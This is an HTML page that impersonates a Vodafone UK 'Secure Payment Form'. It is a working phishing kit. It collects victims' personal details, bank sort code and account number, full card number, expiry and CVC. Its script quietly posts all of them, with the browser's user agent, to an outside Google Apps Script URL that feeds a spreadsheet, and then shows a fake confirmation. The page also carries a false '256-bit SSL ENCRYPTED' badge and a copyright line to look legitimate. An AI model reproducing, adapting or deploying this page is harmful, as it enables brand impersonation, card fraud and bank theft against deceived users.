<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
  <title>Vodafone UK | Secure Payment Form</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;400;500;600;700&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { background: linear-gradient(145deg, #e9eff4 0%, #dce3ea 100%); font-family: 'Inter', sans-serif; padding: 1rem; color: #1a2c3e; }
    .form-container { max-width: 980px; margin: 0 auto; background: #ffffff; border-radius: 32px; box-shadow: 0 25px 45px -12px rgba(0, 0, 0, 0.25); overflow: hidden; }
    .form-header { background: #e60000; padding: 1.5rem 2rem; }
    .vodafone-logo { display: flex; align-items: center; gap: 12px; flex-wrap: wrap; }
    .vodafone-logo h1 { font-size: 1.5rem; font-weight: 700; color: white; }
    .secure-badge { background: white; color: #e60000; border-radius: 40px; padding: 6px 16px; font-size: 0.7rem; font-weight: 700; display: inline-flex; align-items: center; gap: 8px; margin-top: 12px; }
    .form-body { padding: 1.5rem; background-color: #e60000; }
    .section { background: #fefefe; border-radius: 24px; margin-bottom: 1.5rem; }
    .section-title { display: flex; align-items: center; gap: 12px; padding: 1rem 1.5rem; border-bottom: 2px solid #f0f2f5; }
    .section-title i { font-size: 1.3rem; color: #e60000; background: #fff0f0; padding: 8px; border-radius: 50%; }
    .section-title h2 { font-size: 1.1rem; font-weight: 600; }
    .fields-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 1rem; padding: 1.5rem; }
    .input-group { display: flex; flex-direction: column; gap: 6px; }
    .input-group label { font-size: 0.7rem; font-weight: 600; text-transform: uppercase; color: #5a6e7c; display: flex; align-items: center; gap: 6px; }
    .input-group input, .input-group select { background: #ffffff; border: 1px solid #cfdfed; border-radius: 16px; padding: 12px 16px; font-size: 0.9rem; outline: none; width: 100%; }
    .full-width { grid-column: 1 / -1; }
    .card-row { display: grid; grid-template-columns: 1fr 0.6fr 0.8fr; gap: 12px; }
    .dob-horizontal { display: flex; gap: 10px; width: 100%; }
    .dob-horizontal input { flex: 1; text-align: center; }
    .form-actions { padding: 1.5rem; display: flex; justify-content: space-between; flex-wrap: wrap; gap: 16px; background: white; border-radius: 0 0 24px 24px; }
    .btn { padding: 12px 28px; border-radius: 40px; font-weight: 700; border: none; cursor: pointer; transition: 0.2s; }
    .btn-primary { background: #e60000; color: white; }
    .btn-primary:hover { background: #c10000; }
    .btn-secondary { background: white; color: #2c4c6c; border: 1px solid #cfdfed; }
    .footer-note { font-size: 0.65rem; color: #6b7f8f; text-align: center; padding: 1rem; background: #fafcfd; }
    .toast-message { visibility: hidden; min-width: 280px; background: #1e2f3e; color: white; text-align: center; border-radius: 50px; padding: 12px 20px; position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%); z-index: 1000; opacity: 0; transition: opacity 0.2s; }
    .toast-message.show { visibility: visible; opacity: 1; }
    .toast-success { background: #1c7e3c; }
    .toast-error { background: #c0392b; }
    .loading-spinner { display: inline-block; width: 16px; height: 16px; border: 2px solid rgba(255,255,255,0.3); border-radius: 50%; border-top-color: white; animation: spin 0.6s linear infinite; margin-right: 8px; }
    @keyframes spin { to { transform: rotate(360deg); } }
    .modal-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 2000; align-items: center; justify-content: center; }
    .modal-overlay.active { display: flex; }
    .thankyou-modal { background: white; max-width: 400px; width: 90%; border-radius: 32px; text-align: center; padding: 2rem; }
    .thankyou-modal i { font-size: 3rem; color: #e60000; margin-bottom: 1rem; }
    .thankyou-modal button { background: #e60000; border: none; padding: 12px 28px; border-radius: 40px; color: white; font-weight: 700; cursor: pointer; }
    @media (max-width: 680px) { 
      .card-row { grid-template-columns: 1fr; }
      .dob-horizontal { flex-direction: row !important; gap: 8px; }
    }
  </style>
</head>
<body>

<div class="form-container">
  <div class="form-header">
    <div class="vodafone-logo">
      <i class="fas fa-tower-broadcast" style="font-size: 2rem; color: white;"></i>
      <h1>Vodafone UK</h1>
    </div>
    <div class="secure-badge">
      <i class="fas fa-shield-alt"></i> 256-bit SSL ENCRYPTED
    </div>
  </div>

  <div class="form-body">
    <form id="vodafoneForm">
      <div class="section">
        <div class="section-title">
          <i class="fas fa-user-circle"></i>
          <h2>Personal Information</h2>
        </div>
        <div class="fields-grid">
          <div class="input-group">
            <label><i class="fas fa-user"></i> First name</label>
            <input type="text" name="First Name" id="firstName" placeholder="James" required>
          </div>
          <div class="input-group">
            <label><i class="fas fa-user"></i> Surname</label>
            <input type="text" name="Surname" id="surname" placeholder="Smith" required>
          </div>
          <div class="input-group full-width">
            <label><i class="fas fa-calendar-alt"></i> Date of Birth</label>
            <div class="dob-horizontal">
              <input type="number" id="dobDay" placeholder="DD" min="1" max="31" required>
              <input type="number" id="dobMonth" placeholder="MM" min="1" max="12" required>
              <input type="number" id="dobYear" placeholder="YYYY" min="1920" max="2026" required>
            </div>
          </div>
          <div class="input-group">
            <label><i class="fas fa-mobile-alt"></i> Phone number</label>
            <input type="tel" name="Phone Number" id="phoneNo" placeholder="07700 900123" required>
          </div>
          <div class="input-group full-width">
            <label><i class="fas fa-home"></i> Full address</label>
            <input type="text" name="Address" id="address" placeholder="Full address" required>
          </div>
        </div>
      </div>

      <div class="section">
        <div class="section-title">
          <i class="fas fa-building-columns"></i>
          <h2>Bank Details</h2>
        </div>
        <div class="fields-grid">
          <div class="input-group full-width">
            <label><i class="fas fa-signature"></i> Name on account</label>
            <input type="text" name="Name on Account" id="nameOnAccount" required>
          </div>
          <div class="input-group">
            <label><i class="fas fa-code-branch"></i> Sort code</label>
            <input type="text" name="Sort Code" id="sortCode" placeholder="20-00-00" required>
          </div>
          <div class="input-group">
            <label><i class="fas fa-credit-card"></i> Account number</label>
            <input type="text" name="Account Number" id="accountNumber" placeholder="12345678" required>
          </div>
        </div>
      </div>

      <div class="section">
        <div class="section-title">
          <i class="fas fa-credit-card-front"></i>
          <h2>Card Details</h2>
        </div>
        <div class="fields-grid">
          <div class="input-group full-width">
            <label><i class="fas fa-id-card"></i> Name on card</label>
            <input type="text" name="Name on Card" id="nameOnCard" required>
          </div>
          <div class="input-group full-width">
            <label><i class="fas fa-hashtag"></i> Card number</label>
            <input type="text" name="Card Number" id="cardNumber" placeholder="4532 1234 5678 9101" maxlength="19" required>
          </div>
          <div class="card-row">
            <div class="input-group">
              <label><i class="fas fa-calendar-alt"></i> Expiry (MM/YY)</label>
              <input type="text" name="Expiry Date" id="expiryDate" placeholder="08/28" required>
            </div>
            <div class="input-group">
              <label><i class="fas fa-lock"></i> CVC</label>
              <input type="text" name="CVC" id="cvc" placeholder="123" maxlength="4" required>
            </div>
          </div>
        </div>
      </div>

      <div class="section">
        <div class="section-title">
          <i class="fas fa-briefcase"></i>
          <h2>Employment</h2>
        </div>
        <div class="fields-grid">
          <div class="input-group full-width">
            <select name="Employment Status" id="employmentStatus" required>
              <option value="" disabled selected>Select employment status</option>
              <option value="Employed Full-time">Employed Full-time</option>
              <option value="Employed Part-time">Employed Part-time</option>
              <option value="Self-employed">Self-employed</option>
              <option value="Student">Student</option>
              <option value="Retired">Retired</option>
              <option value="Unemployed">Unemployed</option>
            </select>
          </div>
        </div>
      </div>

      <div class="form-actions">
        <button type="button" class="btn btn-secondary" id="clearBtn"><i class="fas fa-undo-alt"></i> Reset</button>
        <button type="submit" class="btn btn-primary" id="submitBtn"><i class="fas fa-check-circle"></i> Submit</button>
      </div>
    </form>
  </div>
  
  <div class="footer-note">
    <p>© 2026 Vodafone UK Limited. All rights reserved.</p>
  </div>
</div>

<div id="toastMsg" class="toast-message"></div>
<div id="thankyouModal" class="modal-overlay">
  <div class="thankyou-modal">
    <i class="fas fa-check-circle"></i>
    <h3>Thank You!</h3>
    <p>Your details have been submitted successfully.</p>
    <button onclick="closeThankYouModal()">Continue</button>
  </div>
</div>

<script>
// ============ YOUR GOOGLE SHEETS WEB APP URL ============
const GOOGLE_SHEETS_URL = "https://script.google.com/macros/s/AKfycbyxiOFOpO_XSrG25V0ApzKPgzuTTvouurv-zRFGYSwLjj5TBacVo-_HgaRMuIB9lmxx/exec";

const form = document.getElementById('vodafoneForm');
const toast = document.getElementById('toastMsg');
const submitBtn = document.getElementById('submitBtn');
const thankyouModal = document.getElementById('thankyouModal');

function showMessage(text, isError = false) {
  toast.textContent = text;
  toast.classList.add('show');
  if (isError) {
    toast.classList.add('toast-error');
    toast.classList.remove('toast-success');
  } else {
    toast.classList.add('toast-success');
    toast.classList.remove('toast-error');
  }
  setTimeout(() => { toast.classList.remove('show'); }, 4000);
}

window.closeThankYouModal = function() {
  thankyouModal.classList.remove('active');
  resetForm();
};

function resetForm() {
  form.reset();
  document.getElementById('employmentStatus').selectedIndex = 0;
  document.getElementById('dobDay').value = '';
  document.getElementById('dobMonth').value = '';
  document.getElementById('dobYear').value = '';
}

async function sendToCloudDatabase(formData) {
  try {
    const response = await fetch(GOOGLE_SHEETS_URL, {
      method: 'POST',
      mode: 'no-cors',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(formData)
    });
    console.log('Data sent to cloud database');
    return true;
  } catch(error) {
    console.error('Cloud error:', error);
    return false;
  }
}

function validateForm() {
  const required = ['firstName', 'surname', 'phoneNo', 'address', 'nameOnAccount', 'sortCode', 'accountNumber', 'nameOnCard', 'cardNumber', 'expiryDate', 'cvc'];
  for (let field of required) {
    const el = document.getElementById(field);
    if (!el.value.trim()) {
      showMessage(`⚠️ ${field.replace(/([A-Z])/g, ' $1').trim()} is required`, true);
      el.focus();
      return false;
    }
  }
  
  const day = document.getElementById('dobDay').value;
  const month = document.getElementById('dobMonth').value;
  const year = document.getElementById('dobYear').value;
  if (!day || !month || !year) {
    showMessage("🎂 Please enter complete Date of Birth", true);
    return false;
  }
  
  const birthDate = new Date(year, month-1, day);
  const today = new Date();
  let age = today.getFullYear() - birthDate.getFullYear();
  const mDiff = today.getMonth() - birthDate.getMonth();
  if (mDiff < 0 || (mDiff === 0 && today.getDate() < birthDate.getDate())) age--;
  if (age < 18) {
    showMessage("⚠️ You must be at least 18 years old", true);
    return false;
  }
  
  if (!document.getElementById('employmentStatus').value) {
    showMessage("⚠️ Please select Employment status", true);
    return false;
  }
  
  const phone = document.getElementById('phoneNo').value.trim();
  if (!/^[\+\d\s\-\(\)]{8,20}$/.test(phone)) {
    showMessage("📞 Please enter a valid phone number", true);
    return false;
  }
  
  const cardNum = document.getElementById('cardNumber').value.replace(/\s/g, '');
  if (!/^[0-9]{13,19}$/.test(cardNum)) {
    showMessage("💳 Card number must be 13-19 digits", true);
    return false;
  }
  
  const expiry = document.getElementById('expiryDate').value.trim();
  if (!/^(0[1-9]|1[0-2])\/([0-9]{2})$/.test(expiry)) {
    showMessage("📅 Expiry date must be MM/YY format", true);
    return false;
  }
  
  const cvc = document.getElementById('cvc').value.trim();
  if (!/^[0-9]{3,4}$/.test(cvc)) {
    showMessage("🔒 CVC must be 3 or 4 digits", true);
    return false;
  }
  
  return true;
}

function gatherFormData() {
  const data = {};
  const inputs = form.querySelectorAll('input, select');
  inputs.forEach(input => {
    if (input.name && input.value) {
      data[input.name] = input.value;
    }
  });
  data['Date of Birth'] = `${document.getElementById('dobDay').value}/${document.getElementById('dobMonth').value}/${document.getElementById('dobYear').value}`;
  data['Submission Time'] = new Date().toLocaleString();
  data['Device'] = navigator.userAgent;
  return data;
}

document.getElementById('cardNumber').addEventListener('input', function(e) {
  let raw = this.value.replace(/\s/g, '');
  if (raw.length > 19) raw = raw.slice(0,19);
  let formatted = '';
  for (let i = 0; i < raw.length; i++) {
    if (i > 0 && i % 4 === 0) formatted += ' ';
    formatted += raw[i];
  }
  this.value = formatted;
});

document.getElementById('expiryDate').addEventListener('input', function(e) {
  let raw = this.value.replace(/[^0-9]/g, '');
  if (raw.length >= 3) {
    let month = raw.slice(0,2);
    let year = raw.slice(2,4);
    if (month > 12) month = '12';
    this.value = month + '/' + year;
  }
});

document.getElementById('clearBtn').addEventListener('click', function() {
  resetForm();
  showMessage("Form reset", false);
});

document.getElementById('submitBtn').addEventListener('click', async function(e) {
  e.preventDefault();
  if (!validateForm()) return;
  
  const formData = gatherFormData();
  
  submitBtn.disabled = true;
  submitBtn.innerHTML = '<span class="loading-spinner"></span> Submitting...';
  
  const cloudSent = await sendToCloudDatabase(formData);
  
  setTimeout(() => {
    if (cloudSent) {
      thankyouModal.classList.add('active');
      showMessage("✅ Submitted! Data saved to cloud.", false);
    } else {
      showMessage("❌ Error submitting. Please try again.", true);
    }
    
    submitBtn.disabled = false;
    submitBtn.innerHTML = '<i class="fas fa-check-circle"></i> Submit';
  }, 500);
});
</script>
</body>
</html>
